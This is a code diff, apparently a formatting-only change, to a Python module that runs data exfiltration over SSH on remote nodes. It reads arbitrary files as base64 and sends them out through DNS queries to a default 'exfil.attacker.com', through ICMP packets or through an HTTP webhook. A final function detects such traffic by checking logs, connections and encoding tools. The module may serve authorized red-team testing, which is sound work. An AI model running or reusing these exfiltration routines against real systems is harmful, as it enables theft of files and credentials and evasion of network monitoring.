@@ -12,6 +12,7 @@ Provides:
     Unauthorized data exfiltration is illegal. Always obtain written
     authorization before performing any security testing.
 """
+
 import asyncio
 import base64
 import os
@@ -24,6 +25,7 @@ from backend.core.logger import log as logger
 
 try:
     import paramiko
+
     PARAMIKO_AVAILABLE = True
 except ImportError:
     PARAMIKO_AVAILABLE = False
@@ -36,7 +38,9 @@ def _ensure_exfil_dir():
     os.makedirs(os.path.join(EXFIL_DIR, "captures"), exist_ok=True)
 
 
-async def _ssh_exec(host: str, username: str, password: str, command: str, port: int = 22) -> tuple[int, str, str]:
+async def _ssh_exec(
+    host: str, username: str, password: str, command: str, port: int = 22
+) -> tuple[int, str, str]:
     """Execute a command over SSH."""
     if not PARAMIKO_AVAILABLE:
         return -1, "", "paramiko not installed"
@@ -46,10 +50,17 @@ async def _ssh_exec(host: str, username: str, password: str, command: str, port:
     try:
         await asyncio.to_thread(
             client.connect,
-            hostname=host, port=port, username=username, password=password,
-            timeout=10, look_for_keys=False, allow_agent=False,
+            hostname=host,
+            port=port,
+            username=username,
+            password=password,
+            timeout=10,
+            look_for_keys=False,
+            allow_agent=False,
         )
-        _, stdout, stderr = await asyncio.to_thread(client.exec_command, command, timeout=60)
+        _, stdout, stderr = await asyncio.to_thread(
+            client.exec_command, command, timeout=60
+        )
         exit_code = await asyncio.to_thread(stdout.channel.recv_exit_status)
         out = await asyncio.to_thread(stdout.read().decode, errors="replace")
         err = await asyncio.to_thread(stderr.read().decode, errors="replace")
@@ -67,7 +78,7 @@ def _chunk_data(data: bytes, chunk_size: int = 63) -> list[bytes]:
     So max raw chunk = 63 / 1.6 ≈ 39 bytes.
     """
     max_raw = int(chunk_size * 0.6)
-    return [data[i:i + max_raw] for i in range(0, len(data), max_raw)]
+    return [data[i : i + max_raw] for i in range(0, len(data), max_raw)]
 
 
 def _encode_chunk(chunk: bytes) -> str:
@@ -119,7 +130,10 @@ async def dns_exfiltrate(
     total_chunks = len(chunks)
 
     # Build the DNS exfiltration script
-    script_lines = ['#!/bin/bash', f'echo "Starting DNS exfiltration: {total_chunks} chunks"']
+    script_lines = [
+        "#!/bin/bash",
+        f'echo "Starting DNS exfiltration: {total_chunks} chunks"',
+    ]
 
     for i, chunk in enumerate(chunks):
         if encoding == "base32":
@@ -135,7 +149,7 @@ async def dns_exfiltrate(
         label = label[:63]
         query_name = f"{label}.{i}.{total_chunks}.{domain}"
 
-        script_lines.append(f'dig +short {query_name} > /dev/null 2>&1')
+        script_lines.append(f"dig +short {query_name} > /dev/null 2>&1")
         script_lines.append(f'echo "Sent chunk {i+1}/{total_chunks}"')
 
     script_lines.append(f'echo "Exfiltration complete: {total_chunks} chunks sent"')
@@ -144,8 +158,7 @@ async def dns_exfiltrate(
 
     # Execute on remote node
     exit_code, out, err = await _ssh_exec(
-        host, username, password,
-        f"bash -c '{script}'"
+        host, username, password, f"bash -c '{script}'"
     )
 
     return {
@@ -235,8 +248,7 @@ print(f"Sent {{packets_sent}} ICMP packets")
 '''
 
     exit_code, out, err = await _ssh_exec(
-        host, username, password,
-        f"python3 -c '{script}'"
+        host, username, password, f"python3 -c '{script}'"
     )
 
     return {
@@ -321,8 +333,10 @@ async def exfil_file(
 
     # Read file on remote node
     exit_code, out, err = await _ssh_exec(
-        host, username, password,
-        f"base64 {file_path} 2>/dev/null || echo FILE_NOT_FOUND"
+        host,
+        username,
+        password,
+        f"base64 {file_path} 2>/dev/null || echo FILE_NOT_FOUND",
     )
 
     if "FILE_NOT_FOUND" in (out or ""):
@@ -339,19 +353,31 @@ async def exfil_file(
 
     if method == "dns":
         return await dns_exfiltrate(
-            node_id, host, username, password,
-            data_str, kwargs.get("domain", "exfil.attacker.com"),
+            node_id,
+            host,
+            username,
+            password,
+            data_str,
+            kwargs.get("domain", "exfil.attacker.com"),
             kwargs.get("encoding", "base32"),
         )
     elif method == "icmp":
         return await icmp_exfiltrate(
-            node_id, host, username, password,
-            data_str, kwargs.get("target_ip", "10.0.0.1"),
+            node_id,
+            host,
+            username,
+            password,
+            data_str,
+            kwargs.get("target_ip", "10.0.0.1"),
         )
     elif method == "http":
         return await http_exfiltrate(
-            node_id, host, username, password,
-            data_str, kwargs.get("webhook_url", ""),
+            node_id,
+            host,
+            username,
+            password,
+            data_str,
+            kwargs.get("webhook_url", ""),
         )
     else:
         return {"success": False, "error": f"Unknown method: {method}"}
@@ -378,46 +404,59 @@ async def detect_exfiltration(
 
     # Check DNS queries
     exit_code, out, _ = await _ssh_exec(
-        host, username, password,
-        "cat /var/log/syslog 2>/dev/null | grep -i 'query\\[A\\]' | tail -50 || journalctl -u systemd-resolved --no-pager -n 50 2>/dev/null"
+        host,
+        username,
+        password,
+        "cat /var/log/syslog 2>/dev/null | grep -i 'query\\[A\\]' | tail -50 || journalctl -u systemd-resolved --no-pager -n 50 2>/dev/null",
     )
     if out:
         dns_lines = out.strip().splitlines()
         if len(dns_lines) > 40:
-            findings.append({
-                "type": "high_dns_volume",
-                "severity": "medium",
-                "description": f"High DNS query volume: {len(dns_lines)} queries in log window",
-            })
+            findings.append(
+                {
+                    "type": "high_dns_volume",
+                    "severity": "medium",
+                    "description": f"High DNS query volume: {len(dns_lines)} queries in log window",
+                }
+            )
 
         # Check for unusual domain patterns (base32 encoded)
         import re
+
         for line in dns_lines:
-            if re.search(r'[a-z2-7]{20,}\.', line):
-                findings.append({
-                    "type": "suspicious_dns",
-                    "severity": "high",
-                    "description": "Suspicious DNS query with encoded subdomain detected",
-                    "sample": line[:100],
-                })
+            if re.search(r"[a-z2-7]{20,}\.", line):
+                findings.append(
+                    {
+                        "type": "suspicious_dns",
+                        "severity": "high",
+                        "description": "Suspicious DNS query with encoded subdomain detected",
+                        "sample": line[:100],
+                    }
+                )
                 break
 
     # Check ICMP traffic
     exit_code, out, _ = await _ssh_exec(
-        host, username, password,
-        "cat /proc/net/snmp | grep -i icmp || echo NO_ICMP_DATA"
+        host,
+        username,
+        password,
+        "cat /proc/net/snmp | grep -i icmp || echo NO_ICMP_DATA",
     )
     if out and "NO_ICMP_DATA" not in out:
-        findings.append({
-            "type": "icmp_activity",
-            "severity": "info",
-            "description": "ICMP activity detected on node",
-        })
+        findings.append(
+            {
+                "type": "icmp_activity",
+                "severity": "info",
+                "description": "ICMP activity detected on node",
+            }
+        )
 
     # Check for large outbound connections
     exit_code, out, _ = await _ssh_exec(
-        host, username, password,
-        "ss -tunap | awk '{if($5 ~ /:/) print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -10"
+        host,
+        username,
+        password,
+        "ss -tunap | awk '{if($5 ~ /:/) print $5}' | cut -d: -f1 | sort | uniq -c | sort -rn | head -10",
     )
     if out:
         for line in out.strip().splitlines():
@@ -426,26 +465,32 @@ async def detect_exfiltration(
                 count, ip = parts
                 try:
                     if int(count) > 100:
-                        findings.append({
-                            "type": "high_connection_volume",
-                            "severity": "medium",
-                            "description": f"High connection count to {ip}: {count} connections",
-                        })
+                        findings.append(
+                            {
+                                "type": "high_connection_volume",
+                                "severity": "medium",
+                                "description": f"High connection count to {ip}: {count} connections",
+                            }
+                        )
                 except ValueError:
                     pass
 
     # Check for base64 encoding tools usage
     exit_code, out, _ = await _ssh_exec(
-        host, username, password,
-        "ps aux | grep -E '(base64|xxd|openssl|curl|wget)' | grep -v grep || echo NONE"
+        host,
+        username,
+        password,
+        "ps aux | grep -E '(base64|xxd|openssl|curl|wget)' | grep -v grep || echo NONE",
     )
     if out and "NONE" not in out:
-        findings.append({
-            "type": "encoding_tools_active",
-            "severity": "high",
-            "description": "Encoding/transfer tools detected running",
-            "processes": out.strip(),
-        })
+        findings.append(
+            {
+                "type": "encoding_tools_active",
+                "severity": "high",
+                "description": "Encoding/transfer tools detected running",
+                "processes": out.strip(),
+            }
+        )
 
     return {
         "success": True,
